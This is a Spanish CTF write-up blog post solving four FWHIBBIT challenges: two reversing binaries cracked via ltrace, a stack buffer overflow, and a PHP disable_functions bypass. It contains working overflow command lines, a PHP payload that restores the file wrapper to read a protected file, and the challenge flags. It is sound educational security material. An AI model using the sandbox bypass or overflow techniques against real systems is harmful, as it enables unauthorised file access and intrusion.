---
published: true
category: CTF
layout: post
---

# Write-Up CTF FWHIBBIT [ES]

## Morocco
**Title:** How Many Rabbits

**Description:** We need the information in this binary password protected...can you help us?

**Category:** Reversing

**Points:** 200

**Link:** [Click here](https://mega.nz/#!N4dDVSYY!mcH-FyRD9cwCuL8i3OFy_1zrA55djoLk9s2Qd7-hPuo)

Tras descargar el archivo ejecutamos file para ver de que se trata.
```
root@kali:~/Desktop# file rabbits 
rabbits: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f975d2c714ce40845978b0c6755fecb08f05c22, stripped
```

Ejecutamos el binario

```
root@kali:~/Desktop# ./rabbits 

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 one rabbit, two rabbit... 
 > one 
 Not enough rabbits :( 
```

Parece que tenemos que saber cuantos conejos necesitamos, así que seguramente estemos frente ante un strcmp que comprueba el input con un string hard-code. Vamos a ejecutarlo con el comando ltrace para debuggerarlo de forma rápida.

```
root@kali:~/Desktop# ltrace /root/Desktop/rabbits
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55bce58491a0, 0x55bce5647d84, 0, 2880) = 0x55bce58491a0
_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_(0x55bce5849080, 0x7ffdc81e4b20, 0x7f65490ba980, 8254 > one
) = 0x55bce5849080
strcmp("one", "twenty_two")                                                        = -5
_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l(0x55bce58491a0, 0x55bce5647d95, 23, 0x7f65485d45a0) = 0x55bce58491a0
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_(0x55bce58491a0, 0x7f6548822760, 0x7f65490ba980, 0x55bce5647dac Not enough rabbits :( 
) = 0x55bce58491a0
+++ exited (status 0) +++

```

Efectivamente, "one" es nuestro input y "twenty_two" es el string esperado.

```
root@kali:~/Desktop# ./rabbits

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 one rabbit, two rabbit... 
 > twenty_two
fwhibbit{Tw3nty_tw0_r4bb1t5_ar3_en0ugh} 
```

## South Africa
**Title:** Mayday Mayday

**Description:** Hi aspirant, we lost all our carrots, for this reason we need your skills so please... try to steal the private bank of carrots for us. The time begins...NOW!

**Category:** Reversing

**Points:** 150

**Link:** [Click here](https://mega.nz/#!HpYxUIIZ!TjDhMDCvazuay1Cats4zObHuRmixGhVa7Sy0-5hnLTg)

Tras descargar el archivo ejecutamos file para de que tipo es.
```
root@kali:~/Desktop# file fwhibbit 
fwhibbit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=bd3ef4bb0664dc621aefcbda1f311aee8a832a9e, not stripped
```

Ejecutamos el binario

```
root@kali:~/Desktop# ./fwhibbit 
||====================================================================||
||//$//////////////////////////////////////////////////////////////$//||
||(100)================| RESERVE BANK OF FWHIBBIT |==============(100)||
||//$//        ~         '------========--------'                //$//||
||<< /        /$/              // ____ //                         / >>||
||>>|        //L//            // ///..) //              XXXX       |<<||
||<<|        // //           || <||  >}  ||                        |>>||
||>>|         /$/            ||  $$ --/  ||          XXXXXXXXX     |<<||
||<<|     Free to Use        *||  ||_/  //*                        |>>||
||>>|                         *||/___|_//*                         |<<||
||<</      Rating: E     _____/ FWHIBBIT /________    XX XXXXX     />>||
||//$/                 ~|  REPUBLIC OF FWHIBBIT   |~              /$//||
||(100)===================  ONE HUNDRED CARROTS =================(100)||
||//$//////////////////////////////////////////////////////////////$//||
||====================================================================||
Fwhibbit Control Access
Enter our password:
password
You Failed
```

Al igual que en el reto anterior, estamos en la misma causistica, un posible strcmp que compara el input con la password valida, por lo tanto, mismo procedimiento usamos ltrace.

```
puts("Fwhibbit Control Access"Fwhibbit Control Access) = 24
puts("Enter our password:"Enter our password:) = 20
__isoc99_scanf(0x400e9d, 0x7fffa1885b40, 0x7f96642a7760, 0x7f9663fe8600 password) = 1
strcmp("null", "password") = -2
puts("You Failed" You Failed) = 11
+++ exited (status 0) +++

```

Como se puede observar, el input es "password" y la cadena esperada es "null".

```
root@kali:~/Desktop# ./fwhibbit 
||====================================================================||
||//$//////////////////////////////////////////////////////////////$//||
||(100)================| RESERVE BANK OF FWHIBBIT |==============(100)||
||//$//        ~         '------========--------'                //$//||
||<< /        /$/              // ____ //                         / >>||
||>>|        //L//            // ///..) //              XXXX       |<<||
||<<|        // //           || <||  >}  ||                        |>>||
||>>|         /$/            ||  $$ --/  ||          XXXXXXXXX     |<<||
||<<|     Free to Use        *||  ||_/  //*                        |>>||
||>>|                         *||/___|_//*                         |<<||
||<</      Rating: E     _____/ FWHIBBIT /________    XX XXXXX     />>||
||//$/                 ~|  REPUBLIC OF FWHIBBIT   |~              /$//||
||(100)===================  ONE HUNDRED CARROTS =================(100)||
||//$//////////////////////////////////////////////////////////////$//||
||====================================================================||
Fwhibbit Control Access
Enter our password:
null
You Win
fwhibbit{fwhibbit_reversing_rul3s}
```


## India
**Title:** Redpill

**Description:** Deciding between the blue pill or the red pill is a tricky decision.
But now...we already make a choice. Try to give the red pill to the rabbits.

**Category:** Exploiting

**Points:** 125

**Link:** [Click here](https://mega.nz/#!NlMlkB6I!ypUjeh2I27f9U5cTu1r_XJBROOV-BQJriRvXeKn_xuk)

Ejecutamos file para ver cual es el tipo de archivo.
```
root@kali:~/Desktop# file fwhibbit 
fwhibbit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=bd3ef4bb0664dc621aefcbda1f311aee8a832a9e, not stripped
```

Ejecutamos el binario.

````
root@kali:~/Desktop# ./redpill PILL

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 Take the Red Pill!! 

     Red Pill  0x50444552
     Your Pill 0x0b103743

  Blue Pill
```

En esta caso estamos antes un buffer overflow en el argumento de entrada.

```
root@kali:~/Desktop# ./redpill $(python -c "print 'A'*100")

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 Take the Red Pill!! 

     Red Pill  0x50444552
     Your Pill 0x41414141

  Blue Pill
Segmentation fault
```

Ahora afinamos el número de carácteres de entrada, hasta conseguir tener el control de la dirección de memoria de "Your Pill", tras varias pruebas descubrimos que el offset es 39. 

```
root@kali:~/Desktop# ./redpill $(python -c "print 'A'*39 + 'B'*4")

        .--``..---.                
         .````--:ohdmNms/`         
          -:/+++/-.:smNd+          
       ```..--:ohmNNdhh.           
     `-. `.``.-+sosshd.         :. 
   -os--/sosdmmNNMMNy         .+// 
  :h+.+hNNMMMNNNMMNm/      `/yNN.` 
 .do/oNNMMMMMmohs+:`    .+hNMMMM-` 
 `yohNhNNNMh-           dosNMMMmo- 
  -mN+hMMMy             .smNMNdd/+`
   yN.hMMh               +NMMNmhds:
   +N//m+                 .osshyho 
  ..smhh                           
   ::oNmy-                         
      .//yhs/:`                    
          :ymNN/                   
         .-+shdho.                 
             `.--..` '''   

 Take the Red Pill!! 

     Red Pill  0x50444552
     Your Pill 0x42424242

  Blue Pill
```

Como se puede observar hemos escrito 'B'*4 en la dirección de memoria, tan solo queda apuntar a la dirección de 'Red Pill'.

```
root@kali:~/Desktop# ./redpill $(python -c "print 'A'*39 + '\x52\x45\x44\x50'")

    .--``..---.                
     .````--:ohdmNms/`         
      -:/+++/-.:smNd+          
   ```..--:ohmNNdhh.           
 `-. `.``.-+sosshd.         :. 
-os--/sosdmmNNMMNy         .+// 
:h+.+hNNMMMNNNMMNm/      `/yNN.` 
.do/oNNMMMMMmohs+:`    .+hNMMMM-` 
`yohNhNNNMh-           dosNMMMmo- 
-mN+hMMMy             .smNMNdd/+`
yN.hMMh               +NMMNmhds:
+N//m+                 .osshyho 
..smhh                           
::oNmy-                         
  .//yhs/:`                    
      :ymNN/                   
     .-+shdho.                 
         `.--..` '''   

Take the Red Pill!! 

 Red Pill  0x50444552
 Your Pill 0x50444552

Red Pill
fwhibbit{t4ke-b0th_1346651474} 
```

## Indonesia
**Title:** Impossible is nothing 

**Description:** One of our rabbits has lost the keys of his server to access his flag. He is crying desperately as he only remember that the flag was in the path: "/tmp/flag.php" but he dont know how to get there. 
Our friend BugsBunny was performing reconnaissance tasks when suddently found a web that could help you, please bring me back his flag.

**Category:** Web

**Points:** 500

**Link:** [Click here](http://web6.ctf.followthewhiterabbit.es:8006/)


Esta prueba estaba pensada para evadir ciertas funciones de php que permiten ejecutar comandos en el sistema o leer archivos.

En el momento en el que se resuelto este reto estaban deshabilitadas las siguientes funciones.

```
[0] => show_source
[1] => system
[2] => shell_exec
[3] => passthru
[4] => exec
[5] => popen
[6] => fopen
[7] => proc_open
[8] => mail
[9] => stream_wrapper_register
[10] => include
[11] => include_once
[12] => require
[13] => require_once
[14] => parse_ini_file
[15] => proc_open
[16] => curl_exec
[17] => set_time_limit
[18] => move_uploaded_file
[19] => file_get_contents
[20] => copy
[21] => file
[22] => glob
[23] => parse_ini_file
```

Despues de varias pruebas, encontre la funcion [stream_wrapper_restore('protocol')](https://secure.php.net/manual/es/function.stream-wrapper-restore.php), la cual permite restaurar a valores por defecto el wrapper del protocolo indicado.

Así que, restauramos el protocolo 'file' y leemos el contenido del archivo /tmp/flag.php

```
Input:
<?php
stream_wrapper_restore('file');
$content = file_get_contents('/tmp/flag.php', NULL, NULL, 11, 45);
var_dump($content);
?>
Output:
string(34) ""fwhibbit{F4st_Cg1_SSRF_P0w3r!}";"
```

Finalmente, tras contactar con el responsable de la prueba, la función de restaurar el wrapper debía de estar deshabilitada. Por lo que. además de conseguir la first blood, obtener una flag de 500 puntos se encontro un bug en el CTF el cual fue reparado inmediatamente.




